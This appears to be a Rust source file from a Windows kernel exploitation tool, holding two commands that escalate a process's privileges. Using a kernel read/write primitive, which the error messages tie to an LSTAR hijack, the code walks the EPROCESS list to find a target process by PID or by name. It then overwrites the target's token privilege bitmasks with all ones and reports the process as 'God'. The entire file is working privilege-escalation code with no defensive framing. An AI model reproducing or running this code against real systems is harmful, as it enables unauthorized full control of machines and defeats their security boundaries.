use anyhow::{bail, Context, Result};

use crate::device::Device;
use crate::eprocess::{
    read_image_filename, EPROC_ACTIVE_LINKS, EPROC_TOKEN, EPROC_UNIQUE_PID, TOKEN_SEP_ENABLED,
    TOKEN_SEP_PRESENT,
};
use crate::kernel_rw::KernelRW;
use crate::utils::{find_export_va, find_mod, get_kernel_modules, ntoskrnl_disk_path};

pub fn cmd_priv(dev: &Device, target_pid: u64) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
        .context("ntoskrnl not found")?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;

    let krw = KernelRW::setup(dev, &pe, nt.va)?;

    let ps_init_va = find_export_va(&pe, nt.va, "PsInitialSystemProcess")?;
    let system_eproc = krw.kread(ps_init_va)?;
    if system_eproc == 0 || system_eproc < 0xFFFF_8000_0000_0000 {
        bail!("kread returned bad value 0x{:016X} - LSTAR hijack failed", system_eproc);
    }

    let mut found_eproc: Option<u64> = None;
    let mut current = system_eproc;
    let mut iterations = 0;
    loop {
        iterations += 1;
        if iterations > 5000 {
            bail!("walk > 5000 it");
        }
        if current < 0xFFFF_8000_0000_0000 {
            bail!("invalid EPROCESS address 0x{:016X}", current);
        }
        let pid = krw.kread(current + EPROC_UNIQUE_PID)?;
        if pid == target_pid {
            found_eproc = Some(current);
            break;
        }
        let flink = krw.kread(current + EPROC_ACTIVE_LINKS)?;
        if flink < 0xFFFF_8000_0000_0000 {
            bail!("invalid flink 0x{:016X} during EPROCESS walk", flink);
        }
        let next = flink.wrapping_sub(EPROC_ACTIVE_LINKS);
        if next == system_eproc || next == 0 { break; }
        current = next;
    }

    let eproc = found_eproc.with_context(|| format!("PID {} not found in EPROCESS list", target_pid))?;
    println!("[+] EPROCESS=0x{:016X}", eproc);

    let token_ref = krw.kread(eproc + EPROC_TOKEN)?;
    let token = token_ref & !0xF;
    println!("[+] Token=0x{:016X}", token);

    krw.kwrite(token + TOKEN_SEP_PRESENT, 0xFFFF_FFFF_FFFF_FFFF)?;
    krw.kwrite(token + TOKEN_SEP_ENABLED, 0xFFFF_FFFF_FFFF_FFFF)?;

    let chk_present = krw.kread(token + TOKEN_SEP_PRESENT)?;
    let chk_enabled = krw.kread(token + TOKEN_SEP_ENABLED)?;
    if chk_present == 0xFFFF_FFFF_FFFF_FFFF && chk_enabled == 0xFFFF_FFFF_FFFF_FFFF {
        println!("[+] PID {} is God", target_pid);
    } else {
        println!("[!] verify mismatch - check offsets");
    }

    Ok(())
}

pub fn cmd_privn(dev: &Device, target_name: &str) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
        .context("ntoskrnl not found")?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;

    let krw = KernelRW::setup(dev, &pe, nt.va)?;

    let ps_init_va = find_export_va(&pe, nt.va, "PsInitialSystemProcess")?;
    let system_eproc = krw.kread(ps_init_va)?;
    if system_eproc == 0 || system_eproc < 0xFFFF_8000_0000_0000 {
        bail!("kread returned bad value 0x{:016X} - LSTAR hijack failed", system_eproc);
    }

    let target_lower = target_name.to_ascii_lowercase();
    let mut matched = 0usize;
    let mut current = system_eproc;
    let mut iterations = 0usize;

    loop {
        iterations += 1;
        if iterations > 5000 {
            bail!("EPROCESS walk exceeded 5000 iterations");
        }
        if current < 0xFFFF_8000_0000_0000 {
            bail!("invalid EPROCESS address 0x{:016X}", current);
        }

        let name = read_image_filename(&krw, current)?;
        if name.to_ascii_lowercase() == target_lower {
            let pid = krw.kread(current + EPROC_UNIQUE_PID)?;

            let token_ref = krw.kread(current + EPROC_TOKEN)?;
            let token = token_ref & !0xF;

            krw.kwrite(token + TOKEN_SEP_PRESENT, 0xFFFF_FFFF_FFFF_FFFF)?;
            krw.kwrite(token + TOKEN_SEP_ENABLED, 0xFFFF_FFFF_FFFF_FFFF)?;

            let chk_present = krw.kread(token + TOKEN_SEP_PRESENT)?;
            let chk_enabled = krw.kread(token + TOKEN_SEP_ENABLED)?;
            if chk_present == 0xFFFF_FFFF_FFFF_FFFF && chk_enabled == 0xFFFF_FFFF_FFFF_FFFF {
                println!("[+] PID {} ({}) is God", pid, name);
            } else {
                println!("[!] PID {} ({}) verify mismatch - check offsets", pid, name);
            }
            matched += 1;
        }

        let flink = krw.kread(current + EPROC_ACTIVE_LINKS)?;
        if flink < 0xFFFF_8000_0000_0000 {
            bail!("invalid flink 0x{:016X} during EPROCESS walk", flink);
        }
        let next = flink.wrapping_sub(EPROC_ACTIVE_LINKS);
        if next == system_eproc || next == 0 { break; }
        current = next;
    }

    if matched == 0 {
        println!("[!] no processes matching '{}'", target_name);
    }
    Ok(())
}
